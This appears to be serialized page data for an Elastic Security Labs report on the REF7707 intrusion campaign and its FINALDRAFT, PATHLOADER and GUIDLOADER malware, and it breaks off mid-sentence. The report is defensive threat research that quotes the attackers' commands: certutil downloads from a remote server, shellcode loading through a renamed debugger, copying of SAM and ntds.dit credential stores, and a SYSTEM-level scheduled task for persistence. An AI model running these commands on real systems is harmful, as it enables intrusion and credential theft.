|\n\n## References\n\nThe following were referenced throughout the above research:\n\n* [https://www.elastic.co/security-labs/finaldraft](https://www.elastic.co/security-labs/finaldraft)\n* [https://mrd0x.com/the-power-of-cdb-debugging-tool/](https://mrd0x.com/the-power-of-cdb-debugging-tool/)\n* [https://web.archive.org/web/20210305190100/http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html](https://web.archive.org/web/20210305190100/http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html) \n\n## About Elastic Security Labs\n\nElastic Security Labs is dedicated to creating positive change in the threat landscape by  providing publicly available research on emerging threats.\n\nFollow Elastic Security Labs on X [@elasticseclabs](https://twitter.com/elasticseclabs?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor) and check out our research at [www.elastic.co/security-labs/](https://www.elastic.co/security-labs/). You can see the technology we leveraged for this research and more by checking out [Elastic Security](https://www.elastic.co/security).\n","code":"var Component=(()=\u003e{var h=Object.create;var d=Object.defineProperty;var f=Object.getOwnPropertyDescriptor;var m=Object.getOwnPropertyNames;var u=Object.getPrototypeOf,p=Object.prototype.hasOwnProperty;var b=(n,e)=\u003e()=\u003e(e||n((e={exports:{}}).exports,e),e.exports),g=(n,e)=\u003e{for(var r in e)d(n,r,{get:e[r],enumerable:!0})},o=(n,e,r,c)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let t of m(e))!p.call(n,t)\u0026\u0026t!==r\u0026\u0026d(n,t,{get:()=\u003ee[t],enumerable:!(c=f(e,t))||c.enumerable});return n};var w=(n,e,r)=\u003e(r=n!=null?h(u(n)):{},o(e||!n||!n.__esModule?d(r,\"default\",{value:n,enumerable:!0}):r,n)),v=n=\u003eo(d({},\"__esModule\",{value:!0}),n);var l=b((R,a)=\u003e{a.exports=_jsx_runtime});var F={};g(F,{default:()=\u003eT,frontmatter:()=\u003ey});var i=w(l()),y={title:\"From South America to Southeast Asia: The Fragile Web of REF7707\",slug:\"fragile-web-ref7707\",date:\"2025-02-13\",description:\"REF7707 targeted a South American foreign ministry using novel malware families. Inconsistent evasion tactics and operational security missteps exposed additional adversary-owned infrastructure.\",author:[{slug:\"andrew-pease\"},{slug:\"seth-goodwin\"}],image:\"ref7707.jpg\",category:[{slug:\"campaigns\"}],tags:[{slug:\"REF7707\"},{slug:\"FINALDRAFT\"},{slug:\"PATHLOADER\"},{slug:\"GUIDLOADER\"}]};function s(n){let e=Object.assign({h2:\"h2\",p:\"p\",a:\"a\",ul:\"ul\",li:\"li\",h3:\"h3\",img:\"img\",pre:\"pre\",code:\"code\",h4:\"h4\",div:\"div\",table:\"table\",thead:\"thead\",tr:\"tr\",th:\"th\",tbody:\"tbody\",td:\"td\"},n.components);return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(e.h2,{id:\"ref7707-summarized\",children:\"REF7707 summarized\"}),`\n`,(0,i.jsx)(e.p,{children:\"Elastic Security Labs has been monitoring a campaign targeting the foreign ministry of a South American nation that has links to other compromises in Southeast Asia. We track this campaign as REF7707.\"}),`\n`,(0,i.jsx)(e.p,{children:\"While the REF7707 campaign is characterized by a well-engineered, highly capable, novel intrusion set, the campaign owners exhibited poor campaign management and inconsistent evasion practices.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"The intrusion set utilized by REF7707 includes novel malware families we refer to as FINALDRAFT, GUIDLOADER, and PATHLOADER. We have provided a detailed analysis of their functions and capabilities in the malware analysis report of REF7707 - \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/finaldraft\",rel:\"nofollow\",children:\"You've Got Malware: FINALDRAFT Hides in Your Drafts\"}),\".\"]}),`\n`,(0,i.jsx)(e.h2,{id:\"key-takeaways\",children:\"Key takeaways\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"REF7707 leveraged novel malware against multiple targets\"}),`\n`,(0,i.jsx)(e.li,{children:\"The FINALDRAFT malware has both a Windows and Linux variant\"}),`\n`,(0,i.jsx)(e.li,{children:\"REF7707 used an uncommon LOLBin to obtain endpoint execution\"}),`\n`,(0,i.jsx)(e.li,{children:\"Heavy use of cloud and third-party services for C2\"}),`\n`,(0,i.jsx)(e.li,{children:\"The attackers used weak operational security that exposed additional malware and infrastructure not used in this campaign\"}),`\n`]}),`\n`,(0,i.jsx)(e.h2,{id:\"campaign-overview\",children:\"Campaign Overview\"}),`\n`,(0,i.jsx)(e.p,{children:\"In late November 2024, Elastic Security Labs observed a tight cluster of endpoint behavioral alerts occurring at the Foreign Ministry of a South American country. As the investigation continued, we discovered a sprawling campaign and intrusion set that included novel malware, sophisticated targeting, and a mature operating cadence.\"}),`\n`,(0,i.jsx)(e.p,{children:\"While parts of the campaign showed a high level of planning and technical competence, numerous tactical oversights exposed malware pre-production samples, infrastructure, and additional victims.\"}),`\n`,(0,i.jsx)(e.h3,{id:\"campaign-layout-the-diamond-model\",children:\"Campaign layout (the diamond model)\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Elastic Security Labs utilizes the \",(0,i.jsx)(e.a,{href:\"https://www.activeresponse.org/wp-content/uploads/2013/07/diamond.pdf\",rel:\"nofollow\",children:\"Diamond Model\"}),\" to describe high-level relationships between adversaries, capabilities, infrastructure, and victims of intrusions. While the Diamond Model is most commonly used with single intrusions and leveraging Activity Threading (section 8) to create relationships between incidents, an adversary-centered (section 7.1.4) approach allows for a \\u2014 although cluttered \\u2014 single diamond.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/fragile-web-ref7707/image1.png\",alt:\"REF7707 - Diamond Model\",title:\"REF7707 - Diamond Model\",width:\"960\",height:\"540\"})}),`\n`,(0,i.jsx)(e.h2,{id:\"execution-flow\",children:\"Execution Flow\"}),`\n`,(0,i.jsx)(e.h3,{id:\"primary-execution-chain\",children:\"Primary execution chain\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"REF7707 was initially identified through Elastic Security telemetry of a South American nation\\u2019s Foreign Ministry. We observed a common LOLBin tactic \",(0,i.jsx)(e.a,{href:\"https://lolbas-project.github.io/lolbas/Binaries/Certutil/\",rel:\"nofollow\",children:\"using Microsoft\\u2019s certutil\"}),\" application to download files from a remote server and save them locally.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`certutil  -urlcache -split -f https://[redacted]/fontdrvhost.exe C:\\\\ProgramData\\\\fontdrvhost.exe\n\ncertutil  -urlcache -split -f https://[redacted]/fontdrvhost.rar C:\\\\ProgramData\\\\fontdrvhost.rar\n\ncertutil  -urlcache -split -f https://[redacted]/config.ini C:\\\\ProgramData\\\\config.ini\n\ncertutil  -urlcache -split -f https://[redacted]/wmsetup.log C:\\\\ProgramData\\\\wmsetup.log\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"The web server hosting \",(0,i.jsx)(e.code,{children:\"fontdrvhost.exe\"}),\", \",(0,i.jsx)(e.code,{children:\"fontdrvhost.rar\"}),\", \",(0,i.jsx)(e.code,{children:\"config.ini\"}),\", and \",(0,i.jsx)(e.code,{children:\"wmsetup.log\"}),\" was located within the same organization; however, it was not running the Elastic Agent. This was the first lateral movement observed and provided insights about the intrusion. We\\u2019ll discuss these files in more detail, but for now, \",(0,i.jsx)(e.code,{children:\"fontdrvhost.exe\"}),\" is a debugging tool, \",(0,i.jsx)(e.code,{children:\"config.ini\"}),\" is a weaponized INI file, and \",(0,i.jsx)(e.code,{children:\"fontdrvhost.rar\"}),\" was not recoverable.\"]}),`\n`,(0,i.jsx)(e.h4,{id:\"winrshostexe\",children:\"WinrsHost.exe\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/winrs\",rel:\"nofollow\",children:\"Windows Remote Management\\u2019s Remote Shell plugin\"}),\" (\",(0,i.jsx)(e.code,{children:\"WinrsHost.exe\"}),\") was used to download the files to this system from an unknown source system on a connected network. The plugin is the client-side process used by Windows Remote Management. It indicates that attackers already possessed valid network credentials and were using them for lateral movement from a previously compromised host in the environment. How these credentials were obtained is unknown; it is possible that the credentials were obtained from the web server hosting the suspicious files.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/fragile-web-ref7707/image4.png\",alt:\"WinrsHost.exe is used to execute commands\",title:\"WinrsHost.exe is used to execute commands\",width:\"1999\",height:\"492\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"The attacker downloaded \",(0,i.jsx)(e.code,{children:\"fontdrvhost.exe\"}),\", \",(0,i.jsx)(e.code,{children:\"fontdrvhost.rar\"}),\", \",(0,i.jsx)(e.code,{children:\"config.ini\"}),\", and \",(0,i.jsx)(e.code,{children:\"wmsetup.log\"}),\" to the \",(0,i.jsx)(e.code,{children:\"C:\\\\ProgramData\\\\\"}),\" directory; from there, the attacker moved to several other Windows endpoints. While we can\\u2019t identify all of the exposed credentials, we noted the use of a local administrator account to download these files.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Following the downloads from the web server to the endpoint, we saw a cluster of behavioral rules firing in quick succession.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/fragile-web-ref7707/image5.png\",alt:\"Behavioral rules accelerating\",title:\"Behavioral rules accelerating\",width:\"1999\",height:\"1042\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"On six Windows systems, we observed the execution of an unidentified binary (\",(0,i.jsx)(e.code,{children:\"08331f33d196ced23bb568689c950b39ff7734b7461d9501c404e2b1dc298cc1\"}),\") as a child of \",(0,i.jsx)(e.code,{children:\"Services.exe\"}),\". This suspicious binary uses a pseudo-randomly assigned file name consisting of six camel case letters with a \",(0,i.jsx)(e.code,{children:\".exe\"}),\" extension and is located in the \",(0,i.jsx)(e.code,{children:\"C:\\\\Windows\\\\\"}),\" path (example: \",(0,i.jsx)(e.code,{children:\"C:\\\\Windows\\\\cCZtzzwy.exe\"}),\"). We could not collect this file for analysis, but we infer that this is a variant of \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/finaldraft\",rel:\"nofollow\",children:\"PATHLOADER\"}),\" based on the file size (\",(0,i.jsx)(e.code,{children:\"170,495\"}),\" bytes) and its location. This file was passed between systems using SMB.\"]}),`\n`,(0,i.jsx)(e.h4,{id:\"fontdrvhostexe\",children:\"FontDrvHost.exe\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Once the attacker collected \",(0,i.jsx)(e.code,{children:\"fontdrvhost.exe\"}),\", \",(0,i.jsx)(e.code,{children:\"fontdrvhost.rar\"}),\", \",(0,i.jsx)(e.code,{children:\"config.ini\"}),\", and \",(0,i.jsx)(e.code,{children:\"wmsetup.log\"}),\", it executed \",(0,i.jsx)(e.code,{children:\"fontdrvhost.exe\"}),\" (\",(0,i.jsx)(e.code,{children:\"cffca467b6ff4dee8391c68650a53f4f3828a0b5a31a9aa501d2272b683205f9\"}),\") to continue with the intrusion. \",(0,i.jsx)(e.code,{children:\"fontdrvhost.exe\"}),\" is a renamed version of the \",(0,i.jsx)(e.a,{href:\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/cdb-command-line-options\",rel:\"nofollow\",children:\"Windows-signed debugger\"}),\" \",(0,i.jsx)(e.code,{children:\"CDB.exe\"}),\". Abuse of this binary allowed our attackers to execute malicious shellcode delivered in the \",(0,i.jsx)(e.code,{children:\"config.ini\"}),\" file under the guise of trusted binaries.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"CDB is a debugger that is over 15 years old. In researching how often it was submitted with suspicious files to VirusTotal, we see increased activity in 2021 and an aggressive acceleration starting in late 2024.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/fragile-web-ref7707/image3.png\",alt:\"VirusTotal submissions and lookups for CDB.exe\",title:\"VirusTotal submissions and lookups for CDB.exe\",width:\"1999\",height:\"441\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"CDB is a \",(0,i.jsx)(e.a,{href:\"https://lolbas-project.github.io/lolbas/OtherMSBinaries/Cdb/\",rel:\"nofollow\",children:\"documented LOLBas file\"}),\", but there hasn\\u2019t been much-published research on how it can be abused. Security researcher mrd0x wrote a \",(0,i.jsx)(e.a,{href:\"https://mrd0x.com/the-power-of-cdb-debugging-tool/\",rel:\"nofollow\",children:\"great analysis\"}),\" of CDB outlining how it can be used to run shellcode, launch executables, run DLLs, execute shell commands, and terminate security solutions (and even an \",(0,i.jsx)(e.a,{href:\"https://web.archive.org/web/20210305190100/http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html\",rel:\"nofollow\",children:\"older analysis\"}),\" from 2016 using it as a shellcode runner). While not novel, this is an uncommon attack methodology and could be used with other intrusion metadata to link actors across campaigns.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"While \",(0,i.jsx)(e.code,{children:\"config.ini\"}),\" was not collected for analysis, it contained a mechanism through which \",(0,i.jsx)(e.code,{children:\"fontdrvhost.exe\"}),\" loaded shellcode; how it was invoked is similar to FINALDRAFT.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`C:\\\\ProgramData\\\\fontdrvhost.exe -cf C:\\\\ProgramData\\\\config.ini -o C:\\\\ProgramData\\\\fontdrvhost.exe\n`})}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"-cf\"}),\" - specifies the path and name of a script file. This script file is executed as soon as the debugger is started\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"config.ini\"}),\" - this is the script to be loaded\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"-o\"}),\" - debugs all processes launched by the target application\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Then \",(0,i.jsx)(e.code,{children:\"fontdrvhost.exe\"}),\" spawned \",(0,i.jsx)(e.code,{children:\"mspaint.exe\"}),\" and injected shellcode into it.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/fragile-web-ref7707/image2.png\",alt:\"Shellcode injection into mspaint.exe\",title:\"Shellcode injection into mspaint.exe\",width:\"1842\",height:\"220\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Elastic Security Labs reverse engineers analyzed this shellcode to identify and characterize the FINALDRAFT malware. Finally, \",(0,i.jsx)(e.code,{children:\"fontdrvhost.exe\"}),\" injected additional shellcode into memory (\",(0,i.jsx)(e.code,{children:\"6d79dfb00da88bb20770ffad636c884bad515def4f8e97e9a9d61473297617e3\"}),\") that was also identified as the FINALDRAFT malware.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"As described in the \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/finaldraft\",rel:\"nofollow\",children:\"analysis\"}),\" of FINALDRAFT, the malware defaults to \",(0,i.jsx)(e.code,{children:\"mspaint.exe\"}),\" or \",(0,i.jsx)(e.code,{children:\"conhost.exe\"}),\" if no target parameter is provided for an injection-related command.\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"connectivity-checks\",children:\"Connectivity checks\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"The adversary performed several connectivity tests using the \",(0,i.jsx)(e.code,{children:\"ping.exe\"}),\" command and via PowerShell.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Powershell\\u2019s \",(0,i.jsx)(e.code,{children:\"Invoke-WebRequest\"}),\" cmdlet is similar to \",(0,i.jsx)(e.code,{children:\"wget\"}),\" or \",(0,i.jsx)(e.code,{children:\"curl,\"}),\" which pulls down the contents of a web resource. This cmdlet may be used to download tooling from the command line, but that was not the case here. These requests in context with several \",(0,i.jsx)(e.code,{children:\"ping\"}),\"s are more likely to be connectivity checks.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:\"graph.microsoft[.]com\"}),\" and \",(0,i.jsx)(e.code,{children:\"login.microsoftonline[.]com\"}),\" are legitimately owned Microsoft sites that serve API and web GUI traffic for Microsoft\\u2019s Outlook cloud email service and other Office 365 products.\"]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"ping graph.microsoft[.]com\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"ping www.google[.]com\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:'Powershell Invoke-WebRequest -Uri \\\\\"hxxps://google[.]com\\\\'})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:'Powershell Invoke-WebRequest -Uri \\\\\"hxxps://graph.microsoft[.]com\\\\\" -UseBasicParsing'})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:'Powershell Invoke-WebRequest -Uri \\\\\"hxxps://login.microsoftonline[.]com\\\\\" -UseBasicParsing'})}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:\"digert.ictnsc[.]com\"}),\" and\",(0,i.jsx)(e.code,{children:\" support.vmphere[.]com\"}),\" were adversary-owned infrastructure.\"]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"ping digert.ictnsc[.]com\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:'Powershell Invoke-WebRequest -Uri \\\\\"hxxps://support.vmphere[.]com\\\\\" -UseBasicParsing'})}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"We cover more about these network domains in the infrastructure section below.\"}),`\n`,(0,i.jsx)(e.h3,{id:\"reconnaissance--enumeration--credential-harvesting\",children:\"Reconnaissance / enumeration / credential harvesting\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"The adversary executed an unknown script called \",(0,i.jsx)(e.code,{children:\"SoftwareDistribution.txt\"}),\"  using the \",(0,i.jsx)(e.code,{children:\"diskshadow.exe\"}),\" utility, extracted the SAM, SECURITY, and SYSTEM Registry hives, and copied the Active Directory database (\",(0,i.jsx)(e.code,{children:\"ntds.dit\"}),\"). These materials primarily contain credentials and credential metadata. The adversary used the 7zip utility to compress the results:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`diskshadow.exe /s C:\\\\\\\\ProgramData\\\\\\\\SoftwareDistribution.txt\n\ncmd.exe /c copy z:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\config\\\\\\\\SAM C:\\\\\\\\ProgramData\\\\\\\\[redacted].local\\\\\\\\SAM /y\n\ncmd.exe /c copy z:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\config\\\\\\\\SECURITY C:\\\\\\\\ProgramData\\\\\\\\[redacted].local\\\\\\\\SECURITY /y\n\ncmd.exe /c copy z:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\config\\\\\\\\SYSTEM C:\\\\\\\\ProgramData\\\\\\\\[redacted].local\\\\\\\\SYSTEM /y\n\ncmd.exe /c copy z:\\\\\\\\windows\\\\\\\\ntds\\\\\\\\ntds.dit C:\\\\\\\\ProgramData\\\\\\\\[redacted].local\\\\\\\\ntds.dit /y\n\n7za.exe a [redacted].local.7z \\\\\"C:\\\\\\\\ProgramData\\\\\\\\[redacted].local\\\\\\\\\\\\\"\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"The adversary also enumerated information about the system and domain:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`systeminfo\n\ndnscmd . /EnumZones\n\nnet group /domain\n\nC:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\net1 group /domain\n\nquser\n\nreg query HKEY_LOCAL_MACHINE\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Explorer\\\\\\\\UUID\n\nreg query \\\\\"HKEY_CURRENT_USER\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Explorer\\\\\\\\UUID\\\\\"\n\nreg query \\\\\"HKEY_LOCAL_MACHINE\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Explorer\\\\\\\\UUID\\\\\"\n`})}),`\n`,(0,i.jsx)(e.h3,{id:\"persistence\",children:\"Persistence\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Persistence was achieved using a \",(0,i.jsx)(e.a,{href:\"https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\",rel:\"nofollow\",children:\"Scheduled Task\"}),\" that invoked the renamed \",(0,i.jsx)(e.code,{children:\"CDB.exe\"}),\" debugger and the weaponized INI file every minute as \",(0,i.jsx)(e.code,{children:\"SYSTEM\"}),\". This methodology ensured that FINALDRAFT resided in memory.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`schtasks /create /RL HIGHEST /F /tn \\\\\"\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\AppID\\\\\\\\EPolicyManager\\\\\" \n/tr \\\\\"C:\\\\\\\\ProgramData\\\\\\\\fontdrvhost.exe -cf C:\\\\\\\\ProgramData\\\\\\\\config.ini -o C:\\\\\\\\ProgramData\\\\\\\\fontdrvhost.exe\\\\\" \n/sc MINUTE /mo 1 /RU SYSTEM\n`})}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"schtasks\"}),\" - the Scheduled Task program\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"/create\"}),\" - creates a new scheduled task\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"/RL HIGHEST\"}),\" - specifies the run level of the job, \",(0,i.jsx)(e.code,{children:\"HIGHEST\"}),\" runs as the highest level of privileges\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"/F\"}),\" - suppress warnings\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"/tn \\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\AppID\\\\\\\\EPolicyManager\\\\\"}),\" - task name, attempting to mirror an authentic looking scheduled task\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:'/tr \\\\\"C:\\\\\\\\ProgramData\\\\\\\\fontdrvhost.exe -cf C:\\\\\\\\ProgramData\\\\\\\\config.ini -o C:\\\\\\\\ProgramData\\\\\\\\fontdrvhost.exe\\\\\"'}),\" - task to run, in this case the \",(0,i.jsx)(e.code,{children:\"fontdrvhost.exe\"}),\" commands we covered earlier\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"/sc MINUTE\"}),\" - schedule type, \",(0,i.jsx)(e.code,{children:\"MINUTE\"}),\" specifies the to run on minute intervals\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"/mo 1\"}),\" - modifier, defines \",(0,i.jsx)(e.code,{children:\"1\"}),\" for the schedule interval\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"/RU SYSTEM\"}),\" - defines what account to run as; in this situation, the task will run as the SYSTEM user\"]}),`\n`]}),`\n`,(0,i.jsx)(e.h3,{id:\"finaldraft-analysis\",children:\"FINALDRAFT Analysis\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"A technical deep-dive describing the capabilities and architecture of the FINALDRAFT and PATHLOADER malware is available \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/finaldraft\",rel:\"nofollow\",children:\"here\"}),\". At a high level, FINALDRAFT is a well-engineered, full-featured remote administration tool with the ability to accept add-on modules that extend functionality and proxy network traffic internally by multiple means.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Although FINALDRAFT can establish command and control using various means, the most notable are the means we observed in our victim environment, \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/finaldraft#communication-protocol\",rel:\"nofollow\",children:\"abuse of Microsoft\\u2019s Graph API\"}),\". We first observed this type of third-party C2 in \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry\",rel:\"nofollow\",children:\"SIESTAGRAPH\"}),\", which we reported in December 2022.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"This command and control type is challenging for defenders of organizations that heavily depend on network visibility to catch. Once the initial execution and check-in have been completed, all further communication proceeds through legitimate Microsoft infrastructure (\",(0,i.jsx)(e.code,{children:\"graph.microsoft[.]com\"}),\") and blends in with the other organizational workstations. It also supports relay functionality that enables it to proxy traffic for other infected systems. It evades defenses reliant on network-based intrusion detection and threat-intelligence indicators.\"]}),`\n`,(0,i.jsx)(e.h4,{id:\"pathloader-and-guidloader\",children:\"PATHLOADER and GUIDLOADER\"}),`\n`,(0,i.jsx)(e.p,{children:\"Both PATHLOADER and GUIDLOADER are used to download and execute encrypted shellcodes in memory. They were discovered in VirusTotal while investigating the C2 infrastructure and strings identified within a FINALDRAFT memory capture. They have only been observed in association with FINALDRAFT payloads.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"A May 2023 sample in VirusTotal is the earliest identified binary of the REF7707 intrusion set. This sample was first submitted by a web user from Thailand, \",(0,i.jsx)(e.code,{children:\"dwn.exe\"}),\" (\",(0,i.jsx)(e.code,{children:\"9a11d6fcf76583f7f70ff55297fb550fed774b61f35ee2edd95cf6f959853bcf\"}),\") is a PATHLOADER variant that loads an encrypted FINALDRAFT binary from\",(0,i.jsx)(e.code,{children:\" poster.checkponit[.]com\"}),\" and \",(0,i.jsx)(e.code,{children:\"support.fortineat[.]com\"}),\".\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Between June and August of 2023, a Hong Kong VirusTotal web user uploaded \",(0,i.jsx)(e.a,{href:\"https://www.virustotal.com/gui/search/41a3a518cc8abad677bb2723e05e2f052509a6f33ea75f32bd6603c96b721081%250Ad9fc1cab72d857b1e4852d414862ed8eab1d42960c1fd643985d352c148a6461%250Af29779049f1fc2d45e43d866a845c45dc9aed6c2d9bbf99a8b1bdacfac2d52f2%250A17b2c6723c11348ab438891bc52d0b29f38fc435c6ba091d4464f9f2a1b926e0%250A20508edac0ca872b7977d1d2b04425aaa999ecf0b8d362c0400abb58bd686f92%250A33f3a8ef2c5fbd45030385b634e40eaa264acbaeb7be851cbf04b62bbe575e75%250A41141e3bdde2a7aebf329ec546745149144eff584b7fe878da7a2ad8391017b9%250A49e383ab6d092ba40e12a255e37ba7997f26239f82bebcd28efaa428254d30e1%250A5e3dbfd543909ff09e343339e4e64f78c874641b4fe9d68367c4d1024fe79249%250A7cd14d3e564a68434e3b705db41bddeb51dbb7d5425fd901c5ec904dbb7b6af0%250A842d6ddb7b26fdb1656235293ebf77c683608f8f312ed917074b30fbd5e8b43d%250Af90420847e1f2378ac8c52463038724533a9183f02ce9ad025a6a10fd4327f12?type=files\",rel:\"nofollow\",children:\"12 samples of GUIDLOADER\"}),\". These samples each had minor modifications to how the encrypted payload was downloaded and were configured to use FINALDRAFT domains:\"]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"poster.checkponit[.]com\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"support.fortineat[.]com\"})}),`\n`,(0,i.jsxs)(e.li,{children:[\"Google Firebase (\",(0,i.jsx)(e.code,{children:\"firebasestorage.googleapis[.]com\"}),\")\"]}),`\n`,(0,i.jsxs)(e.li,{children:[\"Pastebin (\",(0,i.jsx)(e.code,{children:\"pastebin[.]com\"}),\")\"]}),`\n`,(0,i.jsx)(e.li,{children:\"A Southeast Asian University public-facing web storage system\"}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"Some samples of GUIDLOADER appear unfinished or broken, with non-functional decryption routines, while others contain debug strings embedded in the binary. These variations suggest that the samples were part of a development and testing process.\"}),`\n`,(0,i.jsx)(e.h4,{id:\"finaldraft-bridging-os\",children:\"FINALDRAFT bridging OS\\u2019\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"In late 2024, two Linux ELF FINALDRAFT variants were uploaded to VirusTotal, one from the United States and one from Brazil. These samples feature similar C2 versatility and a partial reimplementation of the commands available in the Windows version. URLs were pulled from these files for \",(0,i.jsx)(e.code,{children:\"support.vmphere[.]com\"}),\", \",(0,i.jsx)(e.code,{children:\"update.hobiter[.]com\"}),\", and \",(0,i.jsx)(e.code,{children:\"pastebin.com\"}),\".\"]}),`\n`,(0,i.jsx)(e.h2,{id:\"infrastructure-analysis\",children:\"Infrastructure Analysis\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"In the \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/finaldraft\",rel:\"nofollow\",children:\"FINALDRAFT malware analysis report\"}),\", several domains were identified in the samples collected in the REF7707 intrusion, and other samples were identified through code similarity.\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"service-banner-hashes\",children:\"Service banner hashes\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"A Censys search for \",(0,i.jsx)(e.code,{children:\"hobiter[.]com\"}),\" (the domain observed in the ELF variant of FINALDRAFT, discussed in the previous section) returns an IP address of \",(0,i.jsx)(e.code,{children:\"47.83.8.198\"}),\". This server is Hong Kong-based and is serving 